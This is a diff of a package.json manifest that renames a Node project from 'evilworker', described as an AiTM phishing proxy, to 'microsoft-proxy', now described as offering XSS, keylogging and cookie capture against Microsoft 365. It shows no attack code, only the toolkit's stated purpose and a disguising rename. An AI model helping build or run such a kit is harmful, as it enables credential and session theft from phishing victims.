@@ -1,18 +1,17 @@
 {
-  "name": "evilworker",
-  "version": "1.0.0",
-  "description": "EvilWorker Proxy Server for AiTM Phishing",
+  "name": "microsoft-proxy",
+  "version": "2.0.0",
+  "description": "Microsoft 365 Proxy with XSS, Keylogger, Cookie Capture, Service Worker",
   "main": "proxy_server.js",
   "scripts": {
-    "start": "node proxy_server.js"
+    "start": "node proxy_server.js",
+    "dev": "nodemon proxy_server.js"
   },
   "dependencies": {
-    "axios": "^1.7.2",
-    "cors": "^2.8.5",
-    "express": "^4.19.2"
+    "axios": "^1.6.0",
+    "dotenv": "^16.3.1"
   },
-  "engines": {
-    "node": ">=18.0.0"
-  },
-  "license": "ISC"
+  "devDependencies": {
+    "nodemon": "^3.0.1"
+  }
 }
